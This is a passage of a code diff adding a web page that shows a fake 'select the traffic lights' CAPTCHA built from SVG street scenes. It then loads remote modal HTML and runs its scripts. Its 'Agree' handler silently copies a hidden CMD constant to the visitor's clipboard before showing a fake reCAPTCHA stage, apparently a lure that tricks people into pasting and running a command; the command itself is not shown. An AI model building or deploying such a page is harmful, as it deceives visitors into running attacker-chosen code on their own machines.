+      '<rect x="92" y="36" width="3" height="72" fill="#fff" opacity=".4"/>' +
+      '<rect x="132" y="36" width="3" height="72" fill="#fff" opacity=".4"/>' +
+      // car
+      '<rect x="18" y="46" width="30" height="52" rx="3" fill="#5577bb"/>' +
+      '<rect x="20" y="50" width="26" height="18" fill="#aaccee" rx="2"/>' +
+      '<rect x="20" y="88" width="10" height="7" rx="2" fill="#1a1a1a"/>' +
+      '<rect x="36" y="88" width="10" height="7" rx="2" fill="#1a1a1a"/>',
+
+      // N-5: Plain crosswalk road, no TL
+      '<rect width="160" height="120" fill="#8aacbc"/>' +
+      '<rect x="0" y="5" width="65" height="78" fill="#8a9aaa"/>' +
+      '<rect x="95" y="0" width="65" height="83" fill="#7a8898"/>' +
+      '<rect x="4" y="12" width="12" height="12" fill="#b0c8de" rx="1"/>' +
+      '<rect x="22" y="12" width="12" height="12" fill="#b0c8de" rx="1"/>' +
+      '<rect x="40" y="12" width="12" height="12" fill="#b0c8de" rx="1"/>' +
+      '<rect y="82" width="160" height="38" fill="#787878"/>' +
+      '<rect y="80" width="160" height="4" fill="#8a8a8a"/>' +
+      // crosswalk stripes
+      '<rect x="6" y="86" width="10" height="28" fill="#fff" opacity=".75"/>' +
+      '<rect x="22" y="86" width="10" height="28" fill="#fff" opacity=".75"/>' +
+      '<rect x="38" y="86" width="10" height="28" fill="#fff" opacity=".75"/>' +
+      '<rect x="54" y="86" width="10" height="28" fill="#fff" opacity=".75"/>' +
+      // road dashes (right side)
+      '<rect x="90" y="96" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="118" y="96" width="18" height="5" fill="#f0c000"/>' +
+      // blue bus (right)
+      '<rect x="100" y="82" width="52" height="28" rx="3" fill="#2860c8"/>' +
+      '<rect x="106" y="84" width="14" height="14" fill="#c8e8f8" rx="1"/>' +
+      '<rect x="126" y="84" width="14" height="14" fill="#c8e8f8" rx="1"/>',
+
+      // N-6: Tall building facade, no road
+      '<rect width="160" height="120" fill="#b0c8dc"/>' +
+      '<rect width="160" height="120" fill="#9aaab8"/>' +
+      '<rect width="160" height="10" fill="#7a8aa8"/>' +
+      '<rect x="10" y="18" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="36" y="18" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="62" y="18" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="88" y="18" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="114" y="18" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="10" y="44" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="36" y="44" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="62" y="44" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="88" y="44" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="114" y="44" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="10" y="70" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="36" y="70" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="62" y="70" width="18" height="18" fill="#c8ddf0" rx="1"/>' +
+      '<rect x="62" y="96" width="36" height="24" fill="#7a8898"/>',
+
+      // N-7: Gas station, pumps, canopy
+      '<rect width="160" height="120" fill="#98c0d0"/>' +
+      '<rect y="82" width="160" height="38" fill="#787878"/>' +
+      '<rect y="80" width="160" height="4" fill="#8a8a8a"/>' +
+      '<rect x="8" y="96" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="36" y="96" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="64" y="96" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="92" y="96" width="18" height="5" fill="#f0c000"/>' +
+      // canopy
+      '<rect x="20" y="40" width="120" height="42" fill="#d0d0d0"/>' +
+      '<rect x="20" y="38" width="120" height="6" fill="#b8b8b8" rx="1"/>' +
+      // canopy supports
+      '<rect x="28" y="80" width="6" height="4" fill="#aaa"/>' +
+      '<rect x="126" y="80" width="6" height="4" fill="#aaa"/>' +
+      // fuel pumps
+      '<rect x="48" y="48" width="20" height="32" rx="3" fill="#8899aa"/>' +
+      '<rect x="50" y="52" width="16" height="10" fill="#cde" rx="1"/>' +
+      '<rect x="56" y="64" width="4" height="14" fill="#778"/>' +
+      '<rect x="92" y="48" width="20" height="32" rx="3" fill="#8899aa"/>' +
+      '<rect x="94" y="52" width="16" height="10" fill="#cde" rx="1"/>' +
+      '<rect x="100" y="64" width="4" height="14" fill="#778"/>',
+
+      // N-8: Billboard / advertisement sign
+      '<rect width="160" height="120" fill="#a8c4d4"/>' +
+      '<rect x="0" y="10" width="70" height="73" fill="#c8b890"/>' +
+      '<rect x="0" y="10" width="70" height="9" fill="#a89870"/>' +
+      '<rect x="6" y="25" width="14" height="14" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="26" y="25" width="14" height="14" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="46" y="25" width="14" height="14" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="6" y="46" width="14" height="14" fill="#e8e0c0" rx="1"/>' +
+      '<rect x="26" y="46" width="14" height="14" fill="#e8e0c0" rx="1"/>' +
+      // billboard
+      '<rect x="88" y="22" width="62" height="40" rx="3" fill="#1a6ab8"/>' +
+      '<rect x="92" y="26" width="54" height="32" fill="#2a7ac8" rx="1"/>' +
+      '<rect x="116" y="62" width="6" height="22" fill="#777"/>' +
+      '<rect y="82" width="160" height="38" fill="#787878"/>' +
+      '<rect y="80" width="160" height="4" fill="#8a8a8a"/>' +
+      '<rect x="8" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="36" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="64" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="92" y="97" width="18" height="5" fill="#f0c000"/>' +
+      '<rect x="120" y="97" width="18" height="5" fill="#f0c000"/>',
+
+      // N-9: Road + lamppost (NOT a TL - single white light, curved arm)
+      '<rect width="160" height="120" fill="#1a2538"/>' +
+      '<rect x="0" y="5" width="72" height="78" fill="#1e2d42"/>' +
+      '<rect x="88" y="0" width="72" height="83" fill="#1c2a3c"/>' +
+      '<rect x="6" y="14" width="12" height="10" fill="#ffd" opacity=".6" rx="1"/>' +
+      '<rect x="24" y="14" width="12" height="10" fill="#ffd" opacity=".4" rx="1"/>' +
+      '<rect x="94" y="10" width="12" height="10" fill="#ffd" opacity=".6" rx="1"/>' +
+      '<rect x="112" y="10" width="12" height="10" fill="#ffd" opacity=".5" rx="1"/>' +
+      '<rect y="82" width="160" height="38" fill="#3a3a3a"/>' +
+      '<rect y="80" width="160" height="4" fill="#555"/>' +
+      '<rect x="8" y="96" width="18" height="4" fill="#f0c000" opacity=".7"/>' +
+      '<rect x="36" y="96" width="18" height="4" fill="#f0c000" opacity=".7"/>' +
+      '<rect x="64" y="96" width="18" height="4" fill="#f0c000" opacity=".7"/>' +
+      '<rect x="92" y="96" width="18" height="4" fill="#f0c000" opacity=".7"/>' +
+      // lamppost (single head, curved arm — clearly NOT a TL)
+      '<rect x="76" y="22" width="5" height="60" fill="#556"/>' +
+      '<rect x="58" y="20" width="23" height="5" rx="2" fill="#556"/>' +
+      '<ellipse cx="60" cy="22" rx="8" ry="5" fill="#ffe090" opacity=".8"/>'
+    ];
+
+    function shuffle(arr) {
+      for (var i = arr.length-1; i>0; i--) {
+        var j = Math.floor(Math.random()*(i+1)), t=arr[i]; arr[i]=arr[j]; arr[j]=t;
+      }
+      return arr;
+    }
+
+    var tlCorrect = new Set(), tlSelected = new Set(), tlAttempts = 1, tlChallengeTime = 0;
+
+    function tlBuildChallenge() {
+      tlSelected = new Set(); tlCorrect = new Set();
+      document.getElementById('tlError').style.display = 'none';
+      document.getElementById('tlCount').textContent = '0 images selected';
+
+      var pickedTL   = shuffle(TL_POOL.slice()).slice(0, 3);
+      var pickedNoTL = shuffle(NO_TL_POOL.slice()).slice(0, 6);
+      var combined   = shuffle(
+        pickedTL.map(function(s){ return {svg:s, hasTL:true}; })
+        .concat(pickedNoTL.map(function(s){ return {svg:s, hasTL:false}; }))
+      );
+
+      var grid = document.getElementById('tlGrid');
+      grid.innerHTML = '';
+      combined.forEach(function(scene, i) {
+        if (scene.hasTL) tlCorrect.add(i);
+        var cell = document.createElement('div');
+        cell.className = 'tl-cell';
+        cell.innerHTML =
+          '<svg class="scene" viewBox="0 0 160 120" xmlns="http://www.w3.org/2000/svg">' + scene.svg + '</svg>' +
+          '<div class="tick"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>';
+        cell.addEventListener('click', function() {
+          if (tlSelected.has(i)) { tlSelected.delete(i); cell.classList.remove('selected'); }
+          else { tlSelected.add(i); cell.classList.add('selected'); }
+          var n = tlSelected.size;
+          document.getElementById('tlCount').textContent =
+            n===0 ? '0 images selected' : n===1 ? '1 image selected' : n+' images selected';
+          document.getElementById('tlError').style.display = 'none';
+        });
+        grid.appendChild(cell);
+      });
+      tlChallengeTime = Date.now();
+    }
+
+    function tlVerify() {
+      if (Date.now() - tlChallengeTime < 800) return;
+      var allOk = true, noWrong = true;
+      tlCorrect.forEach(function(i){ if (!tlSelected.has(i)) allOk = false; });
+      tlSelected.forEach(function(i){ if (!tlCorrect.has(i)) noWrong = false; });
+
+      if (allOk && noWrong) {
+        document.getElementById('stage-tl').classList.add('hidden');
+        loadModal();
+      } else {
+        var cells = document.getElementById('tlGrid').querySelectorAll('.tl-cell');
+        cells.forEach(function(cell, i) {
+          if (tlSelected.has(i) && !tlCorrect.has(i)) {
+            cell.classList.remove('selected'); cell.classList.add('wrong');
+            setTimeout(function(){ cell.classList.remove('wrong'); }, 500);
+          }
+        });
+        tlAttempts = Math.min(tlAttempts+1, 3);
+        document.getElementById('tlAttempt').textContent = 'Attempt '+tlAttempts+' of 3';
+        document.getElementById('tlError').style.display = 'block';
+        setTimeout(tlBuildChallenge, 700);
+      }
+    }
+
+    // ── loadModal ───────────────────────────────────────────────────────
+    function loadModal() {
+      fetch('/modal.html')
+        .then(function(r){ if(!r.ok) throw new Error(); return r.text(); })
+        .then(function(html) {
+          var overlay = document.getElementById('content-overlay');
+          var inner   = document.getElementById('content-inner');
+          inner.innerHTML = html;
+          inner.querySelectorAll('script').forEach(function(old) {
+            var s = document.createElement('script');
+            Array.prototype.forEach.call(old.attributes, function(a){ s.setAttribute(a.name, a.value); });
+            s.textContent = old.textContent;
+            old.replaceWith(s);
+          });
+          overlay.classList.add('visible');
+        })
+        .catch(function(){ alert('Failed to load content. Please refresh.'); });
+    }
+
+    // ── Agree → copy CMD + show reCAPTCHA ──────────────────────────────
+    document.getElementById('agree-btn').addEventListener('click', function() {
+      unlockAudio();
+      copyToClipboard(CMD);
+      document.getElementById('desktop-view').style.display = 'none';
+      document.getElementById('stage-rc').classList.remove('hidden');
+    });
+  </script>
+</body>
+</html>
